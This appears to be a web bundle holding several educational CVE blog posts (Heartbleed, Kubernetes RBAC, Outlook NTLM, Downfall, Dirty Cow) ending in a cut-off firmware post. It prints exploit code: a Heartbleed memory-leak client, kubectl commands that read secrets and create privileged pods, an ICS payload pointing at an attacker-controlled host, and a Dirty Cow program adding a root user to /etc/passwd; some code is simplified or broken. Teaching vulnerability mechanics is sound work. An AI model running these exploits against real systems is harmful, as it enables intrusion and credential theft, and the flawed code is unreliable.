          <code>
import socket<br />
import struct<br />
def create_heartbeat_request():<br />
&nbsp;&nbsp;hb_type = 1<br />
&nbsp;&nbsp;payload = b"Hi"<br />
&nbsp;&nbsp;payload_length = 0xFFFF<br />
&nbsp;&nbsp;return struct.pack(">BHH", hb_type, len(payload), payload_length) + payload<br />
def send_heartbeat_request(host, port):<br />
&nbsp;&nbsp;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />
&nbsp;&nbsp;s.connect((host, port))<br />
&nbsp;&nbsp;s.send(create_heartbeat_request())<br />
&nbsp;&nbsp;response = s.recv(65535)<br />
&nbsp;&nbsp;print("Leaked memory:", response)<br />
send_heartbeat_request("example.com", 443)
          </code>
        </div>

        <h2>Global Chaos and Real-World Impact</h2>
        <p>
          The Heartbleed vulnerability affected a significant portion of the internet, with estimates suggesting that 17% of all secure web servers were compromised. Major companies were forced to take immediate action to patch their systems.
        </p>

        <h2>Detecting Heartbleed</h2>
        <p>
          Security tools like Nmap can be used to detect Heartbleed vulnerabilities. Use the following command:
        </p>
        <div class="code-block">
          <code>
nmap -p 443 --script ssl-heartbleed example.com
          </code>
        </div>

        <h2>Lessons Learned</h2>
        <ul>
          <li><strong>Input Validation:</strong> Validate all inputs, especially lengths and buffer sizes.</li>
          <li><strong>Automated Patching Systems:</strong> Ensure systems are regularly updated.</li>
          <li><strong>Memory Safety Practices:</strong> Use memory-safe programming languages like Rust.</li>
        </ul>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Kg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–1001: Kubernetes RBAC Misconfiguration</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–1001: Kubernetes RBAC Misconfiguration</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–1001?</h2>
        <p>
          Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.
        </p>

        <h3>RBAC in Kubernetes</h3>
        <p>
          RBAC allows administrators to define who can access resources in a Kubernetes cluster and what actions they can perform. Permissions are granted using Roles, Cluster Roles, and Role Bindings.
        </p>

        <h2>The Vulnerability</h2>
        <p>
          CVE-2024–1001 occurs when overly permissive RBAC configurations allow attackers to escalate privileges. Specifically:
        </p>
        <ul>
          <li>Permissions like “create” or “patch” on sensitive resources (e.g., Pods) can be abused.</li>
          <li>Attackers can deploy malicious workloads, extract secrets, or control the cluster API server.</li>
        </ul>

        <h2>Exploit Workflow</h2>
        <h3>RBAC Misconfiguration</h3>
        <div class="code-block">
          <code>
apiVersion: rbac.authorization.k8s.io/v1<br>
kind: Role<br>
metadata:<br>
&nbsp;&nbsp;namespace: vulnerable-namespace<br>
&nbsp;&nbsp;name: overly-permissive-role<br>
rules:<br>
- apiGroups: [""]<br>
&nbsp;&nbsp;resources: ["pods", "secrets"]<br>
&nbsp;&nbsp;verbs: ["get", "create", "patch"]<br>
          </code>
        </div>
        <p>This Role allows anyone bound to it to create and patch Pods and access secrets in the namespace.</p>

        <h3>Step-by-Step Exploit</h3>
        <ol>
          <li><strong>Gain Initial Access:</strong> Assume the attacker has access to a low-privileged service account in the namespace, bound to the misconfigured Role.</li>
          <li><strong>Create a Malicious Pod:</strong> Use the <code>kubectl</code> command to create a Pod with elevated privileges:
            <div class="code-block">
              <code>
kubectl run malicious-pod --image=alpine --restart=Never -- /bin/sh -c "apk add curl; while true; do sleep 3600; done"
              </code>
            </div>
          </li>
          <li><strong>Access Sensitive Secrets:</strong> Once the Pod is running, exec into it:
            <div class="code-block">
              <code>
kubectl exec -it malicious-pod -- /bin/sh<br>
# Inside the Pod:<br>
curl -s -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \\ <br>
https://kubernetes.default.svc/api/v1/namespaces/vulnerable-namespace/secrets
              </code>
            </div>
          </li>
          <li><strong>Escalate Privileges:</strong> Create Pods with privileged containers:
            <div class="code-block">
              <code>
kubectl apply -f - <<EOF<br>
apiVersion: v1<br>
kind: Pod<br>
metadata:<br>
&nbsp;&nbsp;name: root-access-pod<br>
&nbsp;&nbsp;namespace: kube-system<br>
spec:<br>
&nbsp;&nbsp;containers:<br>
&nbsp;&nbsp;- name: root-access-container<br>
&nbsp;&nbsp;&nbsp;&nbsp;image: alpine<br>
&nbsp;&nbsp;&nbsp;&nbsp;securityContext:<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;privileged: true<br>
&nbsp;&nbsp;&nbsp;&nbsp;command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]<br>
EOF
              </code>
            </div>
          </li>
        </ol>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Enforce the Principle of Least Privilege:</strong> Grant only the minimum permissions necessary for users and service accounts to perform their tasks. Avoid broad permissions like “create” or “patch” on sensitive resources.</li>
          <li><strong>Audit RBAC Policies:</strong> Regularly audit your RBAC configurations to identify overly permissive Roles and ClusterRoles:
            <div class="code-block">
              <code>
kubectl get roles,clusterroles,rolebindings,clusterrolebindings --all-namespaces
              </code>
            </div>
          </li>
          <li><strong>Use Pod Security Standards:</strong> Apply Pod Security Standards (PSS) to restrict privileged Pod creation:
            <div class="code-block">
              <code>
apiVersion: policy/v1beta1<br>
kind: PodSecurityPolicy<br>
metadata:<br>
&nbsp;&nbsp;name: restricted<br>
spec:<br>
&nbsp;&nbsp;privileged: false
              </code>
            </div>
          </li>
          <li><strong>Enable Logging and Monitoring:</strong> Monitor for suspicious activities, such as unauthorized Pod creation or access to secrets. Tools like Falco or Kubernetes Audit Logs can help.</li>
          <li><strong>Use Network Policies:</strong> Restrict Pod-to-Pod communication using Kubernetes Network Policies to limit the attack surface.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–1001 underscores the importance of careful RBAC configuration in Kubernetes. Misconfigured permissions can open the door to attackers, allowing them to escalate privileges and take over a cluster. By enforcing least privilege, auditing RBAC policies, and using Pod Security Standards, organizations can safeguard their Kubernetes environments.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Qg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2017–11882?</h2>
        <p>
          CVE-2017–11882 is a critical vulnerability within Microsoft Office’s Equation Editor component. This legacy feature, designed for displaying mathematical equations, contains a memory corruption flaw that lets attackers execute malicious code when users open a specially crafted document. Attackers can exploit this weakness to install malware, steal data, or gain full control over a target system with the same permissions as the user.
        </p>

        <h3>Affected Office Versions:</h3>
        <ul>
          <li>Microsoft Office 2007 (Service Pack 3)</li>
          <li>Microsoft Office 2010 (Service Pack 2)</li>
          <li>Microsoft Office 2013 (Service Pack 1)</li>
          <li>Microsoft Office 2016</li>
        </ul>
        <p>
          Despite being patched in November 2017, the Equation Editor vulnerability remains a key target, with unpatched systems or older Office versions still vulnerable.
        </p>

        <h2>How the Vulnerability Works</h2>
        <p>
          This vulnerability allows remote code execution (RCE) by corrupting memory through Office’s Object Linking and Embedding (OLE) feature when opening a malicious document. Here’s how an attack typically unfolds:
        </p>
        <ol>
          <li><strong>Phishing:</strong> The attacker sends an email with an attachment, like a Word or Excel document, designed to exploit CVE-2017–11882.</li>
          <li><strong>User Action:</strong> The user opens the document, unknowingly triggering malicious code within the Equation Editor.</li>
          <li><strong>System Compromise:</strong> The attacker gains control over the system, potentially installing further malware, stealing sensitive data, or using the compromised system to attack other network resources.</li>
        </ol>

        <h2>Why CVE-2017–11882 Remains a Top Target</h2>
        <p>
          This vulnerability is highly favored by cybercriminals and nation-state hackers from countries like China, Russia, and North Korea. Both the Department of Homeland Security and the FBI have flagged it as a frequently exploited vulnerability. Its persistence can be attributed to:
        </p>
        <ul>
          <li><strong>Ease of Exploitation:</strong> Attackers only need to convince users to open a document, making social engineering attacks highly effective.</li>
          <li><strong>Legacy Code:</strong> The Equation Editor, dating back to 2000, is incompatible with modern Office security features, making it difficult to defend without patching.</li>
          <li><strong>Prevalence of Unpatched Systems:</strong> Many organizations, particularly those with older Office versions, haven’t applied Microsoft’s 2017 patch, leaving them vulnerable.</li>
        </ul>

        <h2>How to Protect Against CVE-2017–11882</h2>
        <p>
          With patches readily available, mitigating CVE-2017–11882 is straightforward, yet it requires proactive security practices. Here’s how organizations can protect themselves:
        </p>
        <ol>
          <li><strong>Update Microsoft Office:</strong> Ensure all Office versions are up-to-date with Microsoft’s security patches. Microsoft’s November 2017 patch addresses CVE-2017–11882 and should be applied immediately to unpatched systems.</li>
          <li><strong>Disable the Equation Editor:</strong> If this feature is unnecessary for your organization, disable it. Doing so removes a significant attack vector.</li>
          <li><strong>Use Modern Endpoint Protection:</strong> Employ advanced endpoint security tools that can detect and block malicious document activity. Many modern security solutions offer protections specifically designed to detect CVE-2017–11882 exploitation.</li>
          <li><strong>User Awareness and Training:</strong> Social engineering plays a significant role in the success of attacks exploiting this vulnerability. Educate users on the risks of opening unknown attachments or clicking links in unsolicited emails.</li>
        </ol>

        <h2>Staying Ahead of Persistent Threats</h2>
        <p>
          The continued exploitation of CVE-2017–11882 underscores the importance of regular patching, user education, and layered security defenses. A vulnerability like this, embedded in software many organizations rely on daily, is a stark reminder that cybersecurity requires constant vigilance.
        </p>
        <p>
          By applying patches, disabling unused features, and maintaining a robust security posture, organizations can effectively protect themselves against even the oldest and most persistent threats in today’s digital landscape. In cybersecurity, diligence, and preparedness are the best defenses against exploitation — whether it’s a vulnerability from yesterday or one that emerges tomorrow.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Zg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>How CVE-2023–23397 Works</h2>
        <p>
          The vulnerability exploits how Microsoft Outlook handles reminders and calendar invites. Normally, Outlook processes these items to display notifications and updates. However, in this case, attackers can create a specially crafted message that tricks Outlook into making an outbound connection to a server under the attacker’s control. This connection is made using NTLM authentication, sending the victim’s NTLM credentials and exposing them to potential misuse.
        </p>

        <h3>Exploit Scenario</h3>
        <ol>
          <li>An attacker crafts a malicious email containing a reminder or calendar invite.</li>
          <li>The email specifies a UNC (Universal Naming Convention) path that points to an attacker-controlled server.</li>
          <li>When Outlook receives and processes this email, it automatically tries to access the specified UNC path, triggering NTLM authentication and sending the victim’s credentials to the attacker.</li>
        </ol>

        <h3>Code and Example</h3>
        <div class="code-block">
          <code>
import http.server<br>
import socketserver<br><br>
class MyRequestHandler(http.server.SimpleHTTPRequestHandler):<br>
&nbsp;&nbsp;&nbsp;&nbsp;def do_GET(self):<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"Received connection from: {self.client_address}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.send_response(200)<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.end_headers()<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.wfile.write(b"Hello, you've been logged!")<br><br>
PORT = 8000<br>
handler = MyRequestHandler<br>
with socketserver.TCPServer(("", PORT), handler) as httpd:<br>
&nbsp;&nbsp;&nbsp;&nbsp;print(f"Serving on port {PORT}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;httpd.serve_forever()<br>
          </code>
        </div>

        <h3>Malicious Email Payload Example</h3>
        <div class="code-block">
          <code>
BEGIN:VCALENDAR<br>
VERSION:2.0<br>
BEGIN:VEVENT<br>
UID:123456<br>
SUMMARY:Malicious Reminder<br>
DTSTART;TZID=Europe/London:20231105T090000<br>
ATTACH;VALUE=URI:\\\\attacker-controlled-server.com\\malicious\\path<br>
END:VEVENT<br>
END:VCALENDAR<br>
          </code>
        </div>

        <h2>Impact and Risks</h2>
        <ul>
          <li><strong>Credential Theft:</strong> If an attacker successfully captures NTLM credentials, they can use them to authenticate against other systems on the same network, potentially gaining unauthorized access.</li>
          <li><strong>No User Interaction Needed:</strong> The lack of user interaction makes this vulnerability particularly dangerous, as even vigilant users can fall victim without realizing it.</li>
          <li><strong>Enterprise Threat:</strong> Organizations with a large number of Outlook users are especially at risk, as the exploit can be used to pivot through corporate networks.</li>
        </ul>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Update Microsoft Outlook:</strong> Microsoft has released patches for this vulnerability. Ensure that all systems are updated to the latest version of Outlook.</li>
          <li><strong>Disable SMB Outbound Traffic:</strong> Blocking outbound SMB traffic at the network perimeter can prevent credentials from being sent to an external server.</li>
          <li><strong>Use Protected Users Group:</strong> Members of this group in Active Directory are protected against NTLM authentication.</li>
          <li><strong>Implement NTLM Blocking Policies:</strong> Where possible, configure policies to restrict NTLM authentication and enforce Kerberos.</li>
        </ol>

        <h3>Defensive Example in PowerShell</h3>
        <div class="code-block">
          <code>
Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0" -Name "RestrictSendingNTLMTraffic" -Value "2"
          </code>
        </div>
        <p>
          This command enforces NTLM restrictions, significantly reducing the risk of credential theft.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Jg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Downfall (CVE-2022–40982)?</h2>
        <p>
          In August 2023, a critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.
        </p>

        <h2>Speculative Execution</h2>
        <p>
          Modern CPUs optimize performance by predicting and executing instructions ahead of time through speculative execution. However, speculative execution does not adhere to standard security checks during execution, which creates opportunities for attackers to access restricted data.
        </p>

        <h2>Downfall’s Mechanism</h2>
        <p>
          Downfall specifically exploits speculative execution in Advanced Vector Extensions (AVX). It leverages a use-after-free vulnerability during the speculative execution of AVX instructions to access sensitive data stored in vector registers.
        </p>

        <h2>Conceptual Exploit Example</h2>
        <p>
          Below is a conceptual C pseudocode to demonstrate how speculative execution attacks like Downfall work. This example is strictly for educational purposes only to understand the mechanics of such vulnerabilities.
        </p>
        <div class="code-block">
          <code>
#include &lt;stdio.h&gt;<br>
#include &lt;immintrin.h&gt;  // For AVX instructions<br>
#include &lt;stdint.h&gt;<br><br>

// Step 1: Setup memory and registers<br>
void setup_sensitive_data() {<br>
    volatile char secret[] = "SensitiveData"; // Simulated sensitive data<br>
    __m256i vector_data = _mm256_loadu_si256((__m256i *)secret); // Load data into vector register<br>
}<br><br>

// Step 2: Induce speculative execution<br>
void trigger_speculative_execution(char *probe_array) {<br>
    volatile uint64_t timing;<br>
    int speculative_index = 1024; // An index beyond bounds for speculative execution<br>
    char leaked_value;<br><br>

    // Access array in a way to induce speculative execution<br>
    if (speculative_index &lt; 512) {  // This branch is speculatively executed<br>
        leaked_value = probe_array[speculative_index];<br>
    }<br><br>

    // Measure timing to infer accessed value (side-channel analysis)<br>
    for (int i = 0; i &lt; 256; i++) {<br>
        timing = measure_timing(&amp;probe_array[i * 64]); // Simulated timing measurement<br>
        if (timing &lt; THRESHOLD) {<br>
            printf("Leaked value: %c\\n", i); // Print inferred value<br>
        }<br>
    }<br>
}<br><br>

// Step 3: Measure cache timing (side-channel)<br>
uint64_t measure_timing(void *addr) {<br>
    uint64_t start, end;<br>
    asm volatile (<br>
        "mfence\\n"<br>
        "lfence\\n"<br>
        "rdtsc\\n"      // Read time-stamp counter<br>
        "mov %%rax, %0\\n"<br>
        "mov (%1), %%r8\\n" // Access memory<br>
        "rdtscp\\n"<br>
        "mov %%rax, %1\\n"<br>
        "mfence\\n"<br>
        : "=r"(start), "=r"(end)<br>
        : "r"(addr)<br>
        : "rax", "rbx", "rcx", "r8"<br>
    );<br>
    return end - start;<br>
}<br><br>

// Main Function<br>
int main() {<br>
    char probe_array[256 * 64]; // Array for side-channel timing analysis<br><br>

    setup_sensitive_data();<br>
    trigger_speculative_execution(probe_array);<br><br>

    return 0;<br>
}
          </code>
        </div>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Intel Microcode Updates:</strong> Intel has released microcode updates to mitigate speculative execution vulnerabilities like Downfall. Update your system’s firmware to the latest version provided by your hardware vendor.</li>
          <li><strong>Implement Operating System Mitigations:</strong> Operating system vendors have introduced software-level protections, such as disabling AVX extensions on affected processors when microcode updates are unavailable.</li>
          <li><strong>Restrict Local Access:</strong> Ensure only trusted users have access to systems. Many speculative execution vulnerabilities require local access to exploit.</li>
          <li><strong>Monitor Performance Impact:</strong> Mitigations may degrade performance, especially for workloads heavily reliant on AVX instructions. Assess the trade-offs based on your environment.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Downfall (CVE-2022–40982) demonstrates the dangers of speculative execution vulnerabilities and the importance of constant vigilance in securing modern computing environments. Organizations must prioritize patching, enforce security policies, and consider performance impacts to balance security and efficiency.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,ey=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Dirty Cow?</h2>
        <p>
          In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.
        </p>

        <h2>What is Copy-On-Write (COW)?</h2>
        <p>
          Copy-On-Write (COW) is a memory optimization technique in Linux where multiple processes share the same memory pages for read operations. If one process tries to modify a shared page, the kernel creates a private copy for that process, ensuring changes don’t affect the original shared memory.
        </p>

        <h2>The Problem</h2>
        <p>
          Dirty Cow arises from a race condition in the kernel’s <code>mmap</code> system call during the handling of COW. By exploiting this condition, an attacker can gain write access to read-only memory, effectively modifying protected files like <code>/etc/passwd</code> or <code>/etc/shadow</code> to escalate privileges.
        </p>

        <h2>Exploitation Workflow</h2>
        <p>The Dirty Cow vulnerability enables an attacker to:</p>
        <ol>
          <li>Create a memory mapping of a file they want to overwrite.</li>
          <li>Exploit the race condition to bypass COW and write directly to the file.</li>
          <li>Modify files like <code>/etc/passwd</code> to add a root user or escalate privileges.</li>
        </ol>

        <h2>Demonstrating Dirty Cow (CVE-2016–5195)</h2>
        <p><strong>Disclaimer:</strong> This demonstration is for educational purposes only. Do not execute this on systems you do not own or have explicit permission to test.</p>

        <h3>Exploit Code</h3>
        <p>Save the following as <code>dirtycow.c</code>:</p>
        <div class="code-block">
          <code>
#include &lt;fcntl.h&gt;<br>
#include &lt;pthread.h&gt;<br>
#include &lt;string.h&gt;<br>
#include &lt;sys/mman.h&gt;<br>
#include &lt;stdio.h&gt;<br>
#include &lt;unistd.h&gt;<br><br>
char *target_file = "/etc/passwd";<br>
char *new_content = "hacked:x:0:0:hacked:/root:/bin/bash\\n";<br>
int f;<br><br>
void *madvise_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        madvise(arg, 100, MADV_DONTNEED);<br>
    }<br>
    return NULL;<br>
}<br><br>
void *write_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        lseek(f, 0, SEEK_SET);<br>
        write(f, new_content, strlen(new_content));<br>
    }<br>
    return NULL;<br>
}<br><br>
int main() {<br>
    f = open(target_file, O_RDONLY);<br>
    if (f &lt; 0) {<br>
        perror("Failed to open target file");<br>
        return 1;<br>
    }<br><br>
    char *map = mmap(NULL, 100, PROT_READ, MAP_PRIVATE, f, 0);<br>
    if (map == MAP_FAILED) {<br>
        perror("mmap failed");<br>
        return 1;<br>
    }<br><br>
    pthread_t t1, t2;<br>
    pthread_create(&amp;t1, NULL, madvise_thread, map);<br>
    pthread_create(&amp;t2, NULL, write_thread, NULL);<br><br>
    pthread_join(t1, NULL);<br>
    pthread_join(t2, NULL);<br><br>
    printf("Exploit complete. Check /etc/passwd for changes.\\n");<br>
    return 0;<br>
}
          </code>
        </div>

        <h3>Compiling and Running the Exploit</h3>
        <div class="code-block">
          <code>
# Compile the exploit<br>
gcc -pthread dirtycow.c -o dirtycow<br><br>
# Run the exploit<br>
./dirtycow<br><br>
# Check for changes<br>
cat /etc/passwd
          </code>
        </div>

        <p>Look for the new root user: <code>hacked:x:0:0:hacked:/root:/bin/bash</code>. You can now switch to this user:</p>
        <div class="code-block">
          <code>su hacked</code>
        </div>

        <h2>Mitigation</h2>
        <ol>
          <li><strong>Patch the Kernel:</strong> Update the Linux kernel to a version where the Dirty Cow vulnerability is fixed.</li>
          <li><strong>Use Access Controls:</strong> Restrict write access to sensitive files like <code>/etc/passwd</code> and <code>/etc/shadow</code> to privileged users only.</li>
          <li><strong>Enable SELinux or AppArmor:</strong> Mandatory Access Control frameworks can prevent unauthorized file modifications.</li>
          <li><strong>Limit Privileges:</strong> Run services and applications with the least privileges necessary to function.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Dirty Cow serves as a stark reminder of the potential impact of race conditions and privilege escalation vulnerabilities. While the Linux kernel is robust, vulnerabilities like this highlight the need for regular updates, proper system configuration, and defense-in-depth security practices.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,ny=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Firmware Exploration: LLM as Your Annotator</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      line-height: 1.6;
      max-width: 900px;
      margin: 2rem auto;
      padding: 0 1rem;
      color: #111827;
      background: #f9fafb;
    }
    h1, h2, h3 {
      color: #111827;
    }
    h1 {
      font-size: 2.2rem;
      margin-bottom: 0.5rem;
    }
    h2 {
      margin-top: 2rem;
      border-bottom: 1px solid #e5e7eb;
      padding-bottom: 0.25rem;
    }
    h3 {
      margin-top: 1.5rem;
    }
    code {
      font-family: "Fira Code", Menlo, Monaco, Consolas, "Courier New", monospace;
      font-size: 0.9rem;
    }
    pre {
      background: #111827;
      color: #e5e7eb;
      padding: 1rem;
      border-radius: 0.5rem;
      overflow-x: auto;
      font-size: 0.9rem;
    }
    blockquote {
      border-left: 4px solid #3b82f6;
      padding-left: 1rem;
      color: #374151;
      margin: 1rem 0;
      background: #eff6ff;
    }
    ul, ol {
      padding-left: 1.4rem;
    }
    hr {
      border: 0;
      border-top: 1px solid #e5e7eb;
      margin: 2rem 0;
    }
    .emoji {
      font-style: normal;
    }
  </style>
</head>
<body>

  <h1>Firmware Exploration: LLM as Your Annotator</h1>

  <p>
    If you’ve ever opened a firmware image and stared at a hex dump thinking “nope,” you’re not alone.
  </p>

  <p>
    Modern IoT and embedded devices ship with complex firmware: full Linux distributions, RTOS kernels, proprietary bootloaders, custom update mechanisms, and often… questionable security decisions. Large-scale studies have shown that firmware is a gold mine for vulnerabilities, from hard-coded credentials to unsafe update logic and exposed debug interfaces.
  </p>

  <p>
